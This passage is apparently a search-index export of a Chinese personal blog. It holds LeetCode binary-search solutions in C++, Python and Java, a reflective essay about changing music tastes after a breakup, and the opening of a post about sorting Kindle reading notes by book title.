cur_path, vis, graph, ans) return ans 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"『leetcode』二分搜索","slug":"leetcode-binary-search","date":"2015-03-01T14:10:10.000Z","updated":"2021-01-08T13:32:16.894Z","comments":true,"path":"leetcode-binary-search/","link":"","permalink":"https://www.hrwhisper.me/leetcode-binary-search/","excerpt":"本次题解包括： 4 Median of Two Sorted Arrays 33 Search in Rotated Sorted Array 34 Search for a Range 35 Search Insert Position 69 Sqrt(x) 74 Search a 2D Matrix 81 Search in Rotated Sorted Array II 153 Find Minimum in Rotated Sorted Array 154 Find Minimum in Rotated Sorted Array II 240 Search a 2D Matrix II","text":"本次题解包括： 4 Median of Two Sorted Arrays 33 Search in Rotated Sorted Array 34 Search for a Range 35 Search Insert Position 69 Sqrt(x) 74 Search a 2D Matrix 81 Search in Rotated Sorted Array II 153 Find Minimum in Rotated Sorted Array 154 Find Minimum in Rotated Sorted Array II 240 Search a 2D Matrix II 4. Median of Two Sorted Arrays There are two sorted arrays nums1 and nums2 of size m and n respectively. Find the median of the two sorted arrays. The overall run time complexity should be O(log (m+n)). Example 1: 1234nums1 &#x3D; [1, 3]nums2 &#x3D; [2]The median is 2.0 Example 2: 1234nums1 &#x3D; [1, 2]nums2 &#x3D; [3, 4]The median is (2 + 3)&#x2F;2 &#x3D; 2.5 题目地址：leetcode Median of Two Sorted Arrays 题意： 给定两个排好序的数组，求它们的中位数。 思路： 首先，求中位数需要注意奇数偶数的情况。 方法一 设nums1长度为m，nums2的长度为n，将问题转化为在两个排好序的数组中找第k = (m + n + 1) / 2 小的元素（若总数是偶数还需要找第k+1大的元素）。 为了方便说明，假设 m&lt;=n 每次a_m= min(m, k/2)，b_mid = k - a_m，然后比较A中第a_m个元素和B中第b_m个元素，即A[a_m - 1]和B[b_m - 1]， 若A[a_m - 1] &lt; B[b_m - 1]，则说明第k小的元素不可能出现在A中的前a_m个，也不可能出现在B中的b_m之后。即在A[a_m:]，B[:b_m + 1]中查找第k - a_m元素。（因为a_m + b_m = k，不可能出现在A的a_m个的话，B中的前b_m个元素已经足够k-a_m个了） 若A[a_m - 1] &gt;B[b_m - 1]，则说明第k小的元素不可能出现在B中的前b_m个，也不会再A中的a_m之后，因此，在A[a_m + 1]，B[b_m:]中查找k - b_m元素 若相等，则找到了 复杂度O(log(m + n)) 1234567891011121314151617181920212223242526272829303132class Solution(object): def findMedianSortedArrays(self, nums1, nums2): &quot;&quot;&quot; :type nums1: List[int] :type nums2: List[int] :rtype: float &quot;&quot;&quot; def find_k_th(k, a, b): m, n = len(a), len(b) if m &gt; n: return find_k_th(k, b, a) if m == 0: return b[k - 1] if k == 1: return min(a[0], b[0]) a_mid = min(k &gt;&gt; 1, m) b_mid = k - a_mid if a[a_mid - 1] &lt; b[b_mid - 1]: return find_k_th(k - a_mid, a[a_mid:], b[:b_mid + 1]) elif a[a_mid - 1] &gt; b[b_mid - 1]: return find_k_th(k - b_mid, a[:a_mid + 1], b[b_mid:]) else: return a[a_mid - 1] m, n = len(nums1), len(nums2) k = (m + n + 1) &gt;&gt; 1 ans = find_k_th(k, nums1, nums2) if (m + n) &amp; 1: return ans ans = ans + find_k_th(k + 1, nums1, nums2) return ans / 2.0 方法二： 同样假设m &lt;= n，我们需要找到的是一个i和一个j，这两个下标分别将两个数组划分为左右两部分： 123 left_part right_partA[0], A[1], ..., A[i-1] A[i], A[i+1], ..., A[m-1]B[0], B[1], ..., B[j-1] B[j], B[j+1], ..., B[n-1] 当然i未必和j相等。若能找到一个这样的i和j，满足： i + j = (m + n + 1) / 2 并且a[i-1] &lt; a[j]， a[j-1] &lt; a[i] 这两个条件使得a[i - 1], 和b[j - 1]恰好为在中间的数，谁大谁就是中位数，若m + n为，偶数，则还要考虑a[i]和a[j]中较小的数。（i=0或j=0或i = m或j = n的特殊情况之后讨论） 因此，可以二分枚举i，起始范围left= 0, right = m，则j = (m + n + 1) / 2 - i， 若a[i] &lt; b[j - 1]，则说明i太小，要增大i，left = i + 1 若a[i - 1] &gt; b[j]，说明i太大，要减小i，right = i - 1 否则找到了i和j的正确位置，看m + n是奇数的话直接返回max(a[i - 1], b [j- 1])即可，否则为(max(a[i - 1], b [j- 1]) + min(a[i], b[j])) / 2 现在讨论边界情况： i = 0时，此时j = (m + n + 1) / 2，此时即可假设a[i-1]必定小于b[j]，只需要看 a[i] &gt; b[j -1]即可 i = m时，此时j = (n - m + 1) / 2 &gt; 0，也可以说a[i] &gt; b[j - 1]，只需要看a[i - 1] &lt; b[j]即可 j = 0和j = n同理 123456789101112131415161718192021222324252627282930class Solution &#123;public: double findMedianSortedArrays(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2) &#123; int m = nums1.size(), n = nums2.size(); if(m &gt; n) return findMedianSortedArrays(nums2, nums1); int left = 0, right = m, half_len = (m + n + 1) &gt;&gt; 1; while(left &lt;= right)&#123; int i = (left + right) &gt;&gt; 1; int j = half_len - i; if(i &gt; 0 &amp;&amp; nums1[i - 1] &gt; nums2[j]) right = i - 1; else if(i &lt; m &amp;&amp; j &gt; 0 &amp;&amp; nums1[i] &lt; nums2[j - 1]) left = i + 1; else&#123; int left_max = i != 0? nums1[i - 1] : INT_MIN; if(j != 0 &amp;&amp; nums2[j - 1] &gt; left_max) left_max = nums2[j - 1]; if((m + n) &amp; 1) return left_max; int right_min = i != m? nums1[i] : INT_MAX; if(j != n &amp;&amp; nums2[j] &lt; right_min) right_min = nums2[j]; return (left_max + right_min) / 2.0; &#125; &#125; return -1.0; &#125;&#125;; 33. Search in Rotated Sorted Array Suppose a sorted array is rotated at some pivot unknown to you beforehand. (i.e., 0 1 2 4 5 6 7 might become 4 5 6 7 0 1 2). You are given a target value to search. If found in the array return its index, otherwise return -1. You may assume no duplicate exists in the array. 题目地址：leetcode Search in Rotated Sorted Array 题目大意给定一个排好序，但是经过旋转的数组（如0 1 2 4 5 6 7 变为 4 5 6 7 0 1 2），且该数组元素唯一。给定一个数，求其出现的下标，若不存在，返回-1 思路： 也是二分搜索。一个trick是A[L] &lt;= A[R]说明 [L,R]为升序 方法一 O(log n) 若nums[mid] == target 没什么好说的，返回mid 若nums[mid] &lt; target 若nums[mid] &lt; nums[right] &amp;&amp; target &lt;= nums[right] nums[mid] &gt; nums[right] 即右边有序且target在右边的范围内或者右边非有序则 left = mid + 1 因为nums[mid] &lt; target 所以若右边非有序，则左边一定有序，target一定大于左边的所有元素，只能在右边 否则right = mid - 1 target &lt; nums[mid] 若nums[left] &lt; nums[mid] &amp;&amp; nums[left] &lt;=target 即左边有序且target在左边的范围内 或者 左边无序列 right = mid - 1; 因为target &lt; nums[mid] ，若左边无序则nums[mid]小于右边的所有元素，只能在左边。 否则left = mid + 1 C++ 1234567891011121314151617181920212223242526class Solution &#123;public: int search(vector&lt;int&gt;&amp; nums, int target) &#123; int left = 0, right = nums.size() - 1; while (left &lt;= right) &#123; int mid = (left + right) &gt;&gt; 1; if (nums[mid] == target) return mid; else if (nums[mid] &lt; target) &#123; if (nums[mid] &lt; nums[right] &amp;&amp; target &lt;= nums[right] || nums[mid] &gt; nums[right]) left = mid + 1; else right = mid - 1; &#125; else &#123; // if (target &lt; nums[mid]) if (nums[left] &lt; nums[mid] &amp;&amp; target &gt;= nums[left] || nums[left] &gt; nums[mid]) right = mid - 1; else left = mid + 1; &#125; &#125; return -1; &#125;&#125;; 方法二 O(log n) 直接看代码，很显然。。 C++ 12345678910111213141516171819202122232425class Solution &#123;public: int search(vector&lt;int&gt;&amp; nums, int target) &#123; int l = 0, r = nums.size() - 1; while (l &lt;= r) &#123; int mid = (l + r) &gt;&gt; 1; if (nums[mid] == target) return mid; if (nums[l] &lt; nums[mid]) &#123; //左边有序 if (nums[l] &lt;= target &amp;&amp; target &lt; nums[mid]) //target在左边 r = mid - 1; else l = mid + 1; &#125; else &#123; if (mid + 1 &lt;= r &amp;&amp; nums[mid + 1] &lt;= target &amp;&amp; target &lt;= nums[r])//target在右边 l = mid + 1; else r = mid - 1; &#125; &#125; return -1; &#125;&#125;; Python 1234567891011121314151617181920212223class Solution(object): def search(self, nums, target): &quot;&quot;&quot; :type nums: List[int] :type target: int :rtype: int &quot;&quot;&quot; left, right = 0, len(nums) - 1 while left &lt;= right: mid = (left + right) &gt;&gt; 1 if nums[mid] == target: return mid if nums[left] &lt;= nums[mid]: if nums[left] &lt;= target &lt; nums[mid]: right = mid - 1 else: left = mid + 1 else: if nums[mid] &lt; target &lt;= nums[right]: left = mid + 1 else: right = mid - 1 return -1 34. Search for a Range Given an array of integers sorted in ascending order, find the starting and ending position of a given target value. Your algorithm's runtime complexity must be in the order of O(log n). If the target is not found in the array, return [-1, -1]. For example, Given [5, 7, 7, 8, 8, 10] and target value 8, return [3, 4]. 题目地址：leetcode Search for a Range 题目大意：给定一个数组A，和一个要查找的数target,返回数组A中出现的位置（第一次出现和最后一次出现），如果不存在，为-1，-1 思路： 就是二分搜索找上下界。（可以先做35题）水~ C++ 1234567891011121314151617181920212223class Solution &#123; int binary_search(bool left, const vector&lt;int&gt; &amp;nums, const int target) &#123; int L = 0, R = nums.size(); while (L &lt; R) &#123; int mid = (L + R) &gt;&gt; 1; if (left ? nums[mid] &lt; target : nums[mid] &lt;= target) L = mid + 1; else R = mid; &#125; return L; &#125;public: vector&lt;int&gt; searchRange(vector&lt;int&gt;&amp; nums, int target) &#123; vector&lt;int&gt; ans&#123; -1, -1 &#125;; int L = binary_search(true, nums, target); if (L == nums.size() || nums[L] != target) return ans; int R = binary_search(false, nums, target); ans = &#123; L, R - 1 &#125;; return ans; &#125;&#125;; Python 123456789101112131415161718192021class Solution(object): def binary_search(self, left, nums, target): L, R = 0, len(nums) while L &lt; R: mid = (L + R) &gt;&gt; 1 if nums[mid] &lt; target or (not left and nums[mid] &lt;= target): L = mid + 1 else: R = mid return L def searchRange(self, nums, target): &quot;&quot;&quot; :type nums: List[int] :type target: int :rtype: List[int] &quot;&quot;&quot; L = self.binary_search(True, nums, target) if L == len(nums) or nums[L] != target: return [-1, -1] R = self.binary_search(False, nums, target) return [L, R - 1] 35 . Search Insert Position Given a sorted array and a target value, return the index if the target is found. If not, return the index where it would be if it were inserted in order. You may assume no duplicates in the array. Here are few examples. [1,3,5,6], 5 → 2 [1,3,5,6], 2 → 1 [1,3,5,6], 7 → 4 [1,3,5,6], 0 → 0 题目地址：leetcode Search Insert Position 题目大意: 给定一个排好序的数组和一个数，返回这个数插入的位置。 思路：水~二分 C++ 1234567891011121314class Solution &#123;public: int searchInsert(vector&lt;int&gt;&amp; nums, int target) &#123; int L = 0, R = nums.size(); while (L &lt; R) &#123; int mid = (L + R) &gt;&gt; 1; if (nums[mid] &lt; target) L = mid + 1; else R = mid; &#125; return L; &#125;&#125;; Python 123456789101112131415class Solution(object): def searchInsert(self, nums, target): &quot;&quot;&quot; :type nums: List[int] :type target: int :rtype: int &quot;&quot;&quot; L, R = 0, len(nums) while L &lt; R: mid = (L + R) &gt;&gt; 1 if nums[mid] &lt; target: L = mid + 1 else: R = mid return L 69. Sqrt(x) Implement int sqrt(int x). Compute and return the square root of x. 题目地址：leetcode Sqrt(x) 题目大意：实现根号n的计算 思路： 方法一： 二分法 C++要用long long 防止越界，py弱类型好处体现出来了。。 C++ 123456789101112131415class Solution &#123;public: int mySqrt(int x) &#123; long long l = 0, r = x &gt;&gt; 1; while (l &lt;= r) &#123; long long mid = l + ((r - l) &gt;&gt; 1); long long mul = mid * mid; if (mul == x) return mid; if (mul &lt; x) l = mid + 1; else r = mid - 1; &#125; long long mul = l * l; return mul &gt; x? l - 1: l; &#125;&#125;; Python 12345678910111213141516class Solution(object): def mySqrt(self, x): &quot;&quot;&quot; :type x: int :rtype: int &quot;&quot;&quot; l, r = 0, x &gt;&gt; 1 while l &lt;= r: mid = (l + r) &gt;&gt; 1 mul = mid ** 2 if mul == x: return mid if mul &lt; x: l = mid + 1 else: r = mid - 1 return l - 1 if l ** 2 &gt; x else l 方法二： 牛顿迭代法 可参考： https://en.wikipedia.org/wiki/Integer_square_root C++ 123456789class Solution &#123;public: int mySqrt(int x) &#123; long long ans = x; while (ans * ans &gt; x) ans = (ans + x / ans) &gt;&gt; 1; return ans; &#125;&#125;; Python 12345678910class Solution(object): def mySqrt(self, x): &quot;&quot;&quot; :type x: int :rtype: int &quot;&quot;&quot; ans = x while ans * ans &gt; x: ans = (ans + x // ans) &gt;&gt; 1 return ans 方法三：位运算 猜测法，当前的 ans (1 &lt;&lt; i)的平方如果不大于x，那么说明当前的位数可以是1 C++ 123456789101112class Solution &#123;public: int mySqrt(int x) &#123; long long ans = 0; for(int i = 15; i &gt;= 0; --i)&#123; // i = 15就可以，因为x最大为2^31 - 1 long long t = ans (1 &lt;&lt; i); if(t * t &lt;= x) ans = t; &#125; return ans; &#125;&#125;; Python 123456789101112class Solution(object): def mySqrt(self, x): &quot;&quot;&quot; :type x: int :rtype: int &quot;&quot;&quot; ans = 0 for i in range(15, -1, -1): t = 1 &lt;&lt; i if (ans t) ** 2 &lt;= x: ans = t return ans 74. Search a 2D Matrix Write an efficient algorithm that searches for a value in an m x n matrix. This matrix has the following properties: Integers in each row are sorted from left to right. The first integer of each row is greater than the last integer of the previous row. For example, Consider the following matrix: 123456[ [1, 3, 5, 7], [10, 11, 16, 20], [23, 30, 34, 50]] Given target = 3, return true. 题目地址：leetcode Search a 2D Matrix 题目大意: 给定一个矩阵，这个矩阵中，每一行的元素均从小到大排好序，且每一行第一个元素大于上一行最后一个元素。给定一个数target，判断target是否存在。 思路： 两次二分。一开始先确定行，取每行最后一个数进行查找。之后在这一行进行查找该元素。 直接把矩阵看成一维的，即L=0,R=m*n-1，而每次matrix[mid/n][mid%n]即可。 C++方法一 123456789101112131415161718192021222324252627282930class Solution &#123; int search_row(const vector&lt;vector&lt;int&gt;&gt;&amp; matrix, const int target) &#123; int l = 0, r = matrix.size(); while (l &lt; r) &#123; int mid = l + ((r - l) &gt;&gt; 1); if (matrix[mid][0] &lt;= target) l = mid + 1; else r = mid; &#125; return l; &#125;public: bool searchMatrix(vector&lt;vector&lt;int&gt;&gt;&amp; matrix, int target) &#123; if (matrix.empty() || matrix[0].empty() || matrix[0][0] &gt; target) return false; int row = search_row(matrix, target) - 1; int l = 0, r = matrix[0].size() - 1; while (l &lt;= r) &#123; int mid = l + ((r - l) &gt;&gt; 1); if (matrix[row][mid] == target) return true; else if (matrix[row][mid] &lt; target) l = mid + 1; else r = mid - 1; &#125; return false; &#125;&#125;; C++方法二 1234567891011121314151617class Solution &#123;public: bool searchMatrix(vector&lt;vector&lt;int&gt;&gt; &amp;matrix, int target) &#123; if (matrix.empty()) return false; int m = matrix.size(), n = matrix[0].size(), L = 0, R = m*n - 1; while (L &lt;= R) &#123; int mid = (L + R) &gt;&gt; 1; if (matrix[mid / n][mid % n] == target) return true; else if (matrix[mid / n][mid % n] &lt; target) L = mid + 1; else R = mid - 1; &#125; return false; &#125;&#125;; python方法二 12345678910111213141516171819class Solution(object): def searchMatrix(self, matrix, target): &quot;&quot;&quot; :type matrix: List[List[int]] :type target: int :rtype: bool &quot;&quot;&quot; if not matrix: return False m, n, = len(matrix), len(matrix[0]) L, R = 0, m * n - 1 while L &lt;= R: mid = (L + R) &gt;&gt; 1 if matrix[mid / n][mid % n] == target: return True elif matrix[mid / n][mid % n] &lt; target: L = mid + 1 else: R = mid - 1 return False 81. Search in Rotated Sorted Array II Follow up for \"Search in Rotated Sorted Array\": What if duplicates are allowed? Would this affect the run-time complexity? How and why? Write a function to determine if a given target is in the array. 题目地址：leetcode Search in Rotated Sorted Array II 题目大意: 把33题的数组改为元素可以重复出现，给定一个target，判断其是否存在。 思路： 和33题相比不同的是，这题元素是可重复的，可重复对于我们的有序判断产生了影响。 原来我们直接A[L] &lt;= A[R]说明 [L,R]为升序，现在不行了，比如11131. 现在还是进行二分搜索。 若nums[mid] == target，返回true nums[left] &lt; nums[mid]: 左边有序，同33题处理。 nums[left] &lt;= target &lt; nums[mid] : right = mid - 1 否则left = mid + 1 nums[left] &gt; nums[mid]: 右边有序，同33题处理。 nums[mid] &lt; target &lt;= nums[right] : left = mid + 1 否则right = mid - 1 否则说明nums[left] == nums[mid] 无法判断应该取左还是右。 如11311111和11111131 因此left+=1 正因为此，最坏情况复杂度为O(n) C++ 1234567891011121314151617181920212223242526class Solution &#123;public: bool search(vector&lt;int&gt;&amp; nums, int target) &#123; int left = 0, right = nums.size() - 1; while (left &lt;= right) &#123; int mid = (left + right) &gt;&gt; 1; if (nums[mid] == target) return true; if (nums[left] &lt; nums[mid]) &#123; if (nums[left] &lt;= target &amp;&amp; target &lt; nums[mid]) right = mid - 1; else left = mid + 1; &#125; else if (nums[left] &gt; nums[mid]) &#123; if (nums[mid] &lt; target &amp;&amp; target &lt;= nums[right]) left = mid + 1; else right = mid - 1; &#125; else ++left; &#125; return false; &#125;&#125;; Python 1234567891011121314151617181920212223242526class Solution(object): def search(self, nums, target): &quot;&quot;&quot; :type nums: List[int] :type target: int :rtype: bool &quot;&quot;&quot; left, right = 0, len(nums) - 1 while left &lt;= right: mid = (left + right) &gt;&gt; 1 if nums[mid] == target: return True if nums[left] &lt; nums[mid]: # 左边有序，同33题处理。 if nums[left] &lt;= target &lt; nums[mid]: right = mid - 1 else: left = mid + 1 elif nums[left] &gt; nums[mid]: # 右边有序，同33题处理 if nums[mid] &lt; target &lt;= nums[right]: left = mid + 1 else: right = mid - 1 else: left += 1 return False 153. Find Minimum in Rotated Sorted Array Suppose a sorted array is rotated at some pivot unknown to you beforehand. (i.e., 0 1 2 4 5 6 7 might become 4 5 6 7 0 1 2). Find the minimum element. You may assume no duplicate exists in the array. 传送门 题意：给定一个排好序，但是经过旋转的数组（数组中无重复元素），求该数组的最小值。 思路：类似前面的81题（排好序的旋转的数组中进行二分查找），这题也一样，A[L]&lt;=A[R]说明数组有序，直接返回A[L] 1234567891011class Solution: # @param num, a list of integer # @return an integer def findMin(self, num): return self.search(num,0,len(num)-1) def search(self,num,L,R): if num[L] &lt;= num[R]: #[L,R] are ordered return num[L] mid = (L+R)&gt;&gt;1 return min(self.search(num,L,mid),self.search(num,mid+1,R)) 方法2，二分搜索 设mid = (left + right) / 2 如果 nums[mid] &lt; nums[right]：说明右半部分不可能有最小的元素，因此right = mid nums[mid] &gt; nums[right]：说明旋转的元素（最小值）一定在(mid, righth]之间，因此left = mid + 1 1234567891011class Solution: def findMin(self, nums: List[int]) -&gt; int: left = 0 right = len(nums) - 1 while left &lt; right: mid = (left + right) &gt;&gt; 1 if nums[mid] &gt; nums[right]: left = mid + 1 else: # nums[mid] &lt; nums[right] right = mid return nums[left] 154. Find Minimum in Rotated Sorted Array II Suppose a sorted array is rotated at some pivot unknown to you beforehand. (i.e., 0 1 2 4 5 6 7 might become 4 5 6 7 0 1 2). Find the minimum element. The array may contain duplicates. 传送门 题意：给定一个排好序，但是经过旋转的数组（数组中有重复元素），求该数组的最小值。 思路：和上面一题不同在于这题有重复元素，仅有A[L]&lt;A[R]时，返回A[L]。 123456789101112class Solution: # @param num, a list of integer # @return an integer def findMin(self, num): return self.search(num,0,len(num)-1) def search(self,num,L,R): if L == R: return num[L] if num[L] &lt; num[R]: #[L,R] are ordered return num[L] mid = (L+R)&gt;&gt;1 return min(self.search(num,L,mid),self.search(num,mid+1,R)) 方法2：二分搜索 设mid = (left + right) / 2， 如果 nums[mid] &lt; nums[right]：说明右半部分不可能有最小的元素，因此right = mid nums[mid] &gt; nums[right]：说明旋转的元素（最小值）一定在(mid, righth]之间，因此left = mid + 1 nums[mid] == nums[right]：无法确定最小值的范围，但是两个元素相等，可以让right - 1来缩小范围 12345678910111213class Solution: def findMin(self, nums: List[int]) -&gt; int: left = 0 right = len(nums) - 1 while left &lt; right: mid = (left + right) &gt;&gt; 1 if nums[mid] &gt; nums[right]: left = mid + 1 elif nums[mid] &lt; nums[right]: right = mid else: right -= 1 return nums[left] 240. Search a 2D Matrix II Write an efficient algorithm that searches for a value in an m x n matrix. This matrix has the following properties: Integers in each row are sorted in ascending from left to right. Integers in each column are sorted in ascending from top to bottom. For example, Consider the following matrix: 1234567[ [1, 4, 7, 11, 15], [2, 5, 8, 12, 19], [3, 6, 9, 16, 22], [10, 13, 14, 17, 24], [18, 21, 23, 26, 30]] Given target = 5, return true. Given target = 20, return false. 题目地址：leetcode Search a 2D Matrix II 题目大意 : 给定一个矩阵，该矩阵满足：每一行和每一列均为升序。给定一个数target，让你判断这个数是否在矩阵中。 思路： 直接想到的是二分搜索，对每一行进行一次二分，复杂度为O(mlogn) C++ 123456789101112131415class Solution &#123;public: bool searchMatrix(vector&lt;vector&lt;int&gt;&gt;&amp; matrix, int target) &#123; for(vector&lt;int&gt; &amp;row: matrix)&#123; int l = 0, r = row.size() - 1; while(l &lt;= r)&#123; int mid = l + ((r - l) &gt;&gt; 1); if(row[mid] == target) return true; else if(row[mid] &lt; target) l = mid + 1; else r = mid - 1; &#125; &#125; return false; &#125;&#125;; Java 12345678910111213141516171819public class Solution &#123; boolean binary_search(int[] a, int target) &#123; int L = 0, R = a.length - 1; while (L &lt;= R) &#123; int mid = (L + R) &gt;&gt; 1; if (a[mid] == target) return true; else if (a[mid] &lt; target) L = mid + 1; else R = mid - 1; &#125; return false; &#125; public boolean searchMatrix(int[][] matrix, int target) &#123; for(int i=0;i&lt;matrix.length;i++)&#123; if (binary_search(matrix[i], target)) return true; &#125; return false; &#125;&#125; Python 1234567891011121314151617181920212223class Solution(object): def binary_search(self, a, target): L, R = 0, len(a) - 1 while L &lt;= R: mid = (L + R) &gt;&gt; 1 if a[mid] == target: return True elif a[mid] &lt; target: L = mid + 1 else: R = mid - 1 return False def searchMatrix(self, matrix, target): &quot;&quot;&quot; :type matrix: List[List[int]] :type target: int :rtype: bool &quot;&quot;&quot; for row in matrix: if self.binary_search(row,target): return True return False 第二种思路是设定初始点为最左下角或者最右上角。以最左下角为例， 当matrix[i][j] == target: 返回true不解释 当matrix[i][j] &lt; target: 说明我们应该向右查找（行为升序） 当matrix[i][j] &gt; target:：说明我们应该向上查找（列为降序） 这样复杂度为O(m+n) C++ 12345678910111213class Solution &#123;public: bool searchMatrix(vector&lt;vector&lt;int&gt;&gt;&amp; matrix, int target) &#123; if(matrix.empty()) return false; int i = matrix.size() - 1, j = 0, n = matrix[0].size(); while(i &gt;= 0 &amp;&amp; j &lt; n)&#123; if(matrix[i][j] == target) return true; else if(matrix[i][j] &lt; target) ++j; else --i; &#125; return false; &#125;&#125;; Java 12345678910111213public class Solution &#123; public boolean searchMatrix(int[][] matrix, int target) &#123; if (matrix.length == 0) return false; int m = matrix.length, n = matrix[0].length; int i = m - 1, j = 0; while (i &gt;= 0 &amp;&amp; j &lt; n) &#123; if (matrix[i][j] == target) return true; else if (matrix[i][j] &lt; target) j++; else i--; &#125; return false; &#125;&#125; Python 123456789101112131415161718class Solution(object): def searchMatrix(self, matrix, target): &quot;&quot;&quot; :type matrix: List[List[int]] :type target: int :rtype: bool &quot;&quot;&quot; if not matrix: return False m, n = len(matrix), len(matrix[0]) i, j = m - 1, 0 while i &gt;= 0 and j &lt; n: if matrix[i][j] == target: return True elif matrix[i][j] &gt; target: i -= 1 else: # matrix[i][j] &lt; target j += 1 return False 初始点为右上角的Python代码。。 123456789101112131415161718class Solution(object): def searchMatrix(self, matrix, target): &quot;&quot;&quot; :type matrix: List[List[int]] :type target: int :rtype: bool &quot;&quot;&quot; if not matrix: return False m, n = len(matrix), len(matrix[0]) i, j = 0, n-1 while i &lt; m and j&gt;=0: if matrix[i][j] == target: return True elif matrix[i][j] &gt; target: j -= 1 else: # matrix[i][j] &lt; target i += 1 return False 这是leetcode 二分搜索的题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"睁开双眼又是谁","slug":"who-i-will-see-when-i-open-my-eyes","date":"2015-02-28T02:54:35.000Z","updated":"2020-10-19T14:35:48.837Z","comments":true,"path":"who-i-will-see-when-i-open-my-eyes/","link":"","permalink":"https://www.hrwhisper.me/who-i-will-see-when-i-open-my-eyes/","excerpt":"-----------当我的播放列表不再是陈奕迅。《题记》","text":"-----------当我的播放列表不再是陈奕迅。《题记》 [hermit auto=\"1\" loop=\"0\" unexpand=\"0\"]netease_songs#:368727[/hermit] 提起笔来，却也不知道要写什么。 昨天和叶B散步，他说自己没出息，回来不都还是这样。 聚聚会，喝喝酒。 是吧，没出息。 对啊，没出息。 我也一样。 也没出息啊。 哦，说说听到的歌吧。 现在正在放的是《当你老了》 莫文蔚。 是春晚听到的歌。 我只是突然想起，这首歌谣。 诗人叶芝。 当你老了， 可有谁还爱你虔诚的灵魂 爱你苍老的脸上的皱纹？ 昨天滚回家赶紧A题，为了今天第100题目标。 A完第3题快12点了。 打开空间，正好看到MB童鞋发的日志。 点进去。 空间的背景音乐是《明天你好》 一听竟然痴了。 多久没听见。 明天你好啊，你好哇明天。 我会幸福，恨我的人也好，爱我的人也好， 我都会幸福。 明天你好，即使长大的我只能奔跑。 摔多痛，都爬起来笑着哭。 Brave,hr. 突然发现。 我的播放列表却不再是陈奕迅。 前几天去唱歌。 才发现，已经没有力气去唱《阿牛》。 已经过了随着他发泄情感的时候了。 甚至对号入座，解析着他唱的一句句话， 意淫着自己在某种情况下的那些情感。 曾经，陈奕迅占据了我绝大部分的播放列表。 现在，即使我突然想起某一首歌，也不会像过去那么热衷。 当我的播放列表不再是陈奕迅, “也突然间 明白未来的路 不平坦 难道说 这改变是 必然” 音响传来牛奶咖啡的声音.(恰好!!!) 是吧,改变时必然.就像我一样. 我也改变了， 下一次有人问起，我想我会坦然， 分手了,我会微笑的说，就像说着别人的故事， 问起为什么，也会像大众的一个标准式的回答：不适合。 即使那不是理由。 何必去怀念自己受过的伤， 不过让一只风筝成全了想飞的初衷， 也让蓝天没有云也辽阔， 也让夕阳缓缓地染红那些玫瑰色的梦。 “何必去怀念犯过的错， 何必去遗憾那些如果。“ 对吧？ 我没有遗憾， 毕竟，那个人从来没有存在过。 也不存在着她对我的那些感情。 如果存在过，那不会是那个样子。 “何必去怀念失去什么， 何必去遗憾没说什么。“ 你不说，就连一句新年快乐都仿佛是多余。 于是我就这样将她忘记。 不再想念， 不再怨念， 不再追寻那个理由， 不再愤愤的说你若无情我便休。 当我的播放列表不再是陈奕迅， 我才明白， 天空、宇宙何其的广阔。 有的人的天空，只能让你流泪，不可舞蹈。 我只想，听着歌，静静的入睡。 让回忆 轻轻的 睡去。 就像我只记得，《飘》青少年版 中 斯佳丽的最后一句话：明天又是新的一天。 明天，你好。","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"谁的呢喃","slug":"whisper/谁的呢喃","permalink":"https://www.hrwhisper.me/categories/whisper/%E8%B0%81%E7%9A%84%E5%91%A2%E5%96%83/"}],"tags":[{"name":"心情","slug":"心情","permalink":"https://www.hrwhisper.me/tags/%E5%BF%83%E6%83%85/"}]},{"title":"kindle paperwhite 笔记按名分类","slug":"kindle-paperwhite-reading-note-classify-by-book-title","date":"2015-02-26T02:24:07.000Z","updated":"2021-01-08T13:42:14.098Z","comments":true,"path":"kindle-paperwhite-reading-note-classify-by-book-title/","link":"","permalink":"https://www.hrwhisper.me/kindle-paperwhite-reading-note-classify-by-book-title/","excerpt":"Cool Idea kindle 是我最喜欢的设备之一，入手一年以来，在上面我已经阅读了将近70本书，而又喜欢原版的系统（因为可以接受各种推送。如浏览网页直接 推送到kindle上等），刷了多看又卸载掉。kindle的原书笔记很丑。而且按照标记笔记时间进行排列。要是我同时读的有多本，标记的也有多本呢？那笔记会十分混乱。所以决定写下代码，帮助我进行分类。 之前在CSDN写过C++的，版本称为1.0吧，不过有bug就是中文字符什么的。 现在更新pyhon2.0版。","text":"Cool Idea kindle 是我最喜欢的设备之一，入手一年以来，在上面我已经阅读了将近70本书，而又喜欢原版的系统（因为可以接受各种推送。如浏览网页直接 推送到kindle上等），刷了多看又卸载掉。kindle的原书笔记很丑。而且按照标记笔记时间进行排列。要是我同时读的有多本，标记的也有多本呢？那笔记会十分混乱。所以决定写下代码，帮助我进行分类。 之前在CSDN写过C++的，版本称为1.0吧，不过有bug就是中文字符什么的。 现在更新pyhon2.0版。 创作过程 1.分析 kindle 原装笔记格式 每条笔记都以书名起始，\"==========\"结束 书名和内容之间有两行空格 123456789101112行者无疆 (余秋雨)- 您在位置 #1635-1636的标注 添加于 2014年8月26日星期二 下午11:33:04看城市潜力，拥挤的市中心不是标志。市中心是一个旋涡，把衰草污浊旋到了外缘。真正的潜力忽闪在小巷的窗台下，近郊的庭园里。&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;行者无疆 (余秋雨)- 您在位置 #1642-1643的标注 添加于 2014年8月26日星期二 下午11:33:33这就像写作，当形容词如女郎盛妆、排比句如情人并肩，那就一定尚未进入文章之道。文章的极致如老街疏桐，桐下旧座，座间闲谈，精致散漫。 